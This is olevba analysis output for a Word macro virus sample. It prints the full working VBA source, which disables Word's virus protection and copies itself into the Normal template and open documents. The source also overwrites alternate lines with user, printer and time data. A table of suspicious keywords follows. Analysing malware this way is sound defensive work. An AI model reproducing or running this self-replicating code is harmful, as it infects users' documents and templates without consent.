olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-ca5c062a5e5db90cc952bd6f2433024a06e8c6db
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-ca5c062a5e5db90cc952bd6f2433024a06e8c6db 
in file: Virus.MSOffice.Source-ca5c062a5e5db90cc952bd6f2433024a06e8c6db - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub AutoOpen()
 
On Error GoTo out
 
Options.VirusProtection = False

Options.SaveNormalPrompt = False
 
Options.ConfirmConversions = False

ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
 
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
 
If Day(Now) = 31 Then MsgBox "�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�" + Chr$(13) + "�  VicodinES /CB /TNN �" + Chr$(13) + "�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�", 0, "This Is Class"
 
If nt = 0 Then
 
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
 
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
 
End If
 
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
 
If nt > 0 And ad > 0 Then GoTo out
 
host.codemodule.AddFromFile ("c:\class.sys")
 
With host.codemodule
 
    For x = 1 To 4
 
    .deletelines 1
 
    Next x
 
End With
 
If nt = 0 Then
 
    With host.codemodule
 
    .replaceline 1, "Sub AutoClose()"
 
    .replaceline 69, "Sub ViewVBCode()"
    
    End With
 
End If
 
With host.codemodule
 
    For x = 2 To 70 Step 2
 
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Now
 
    Next x

End With
 
out:
 
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 
End Sub

Sub ToolsMacro()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

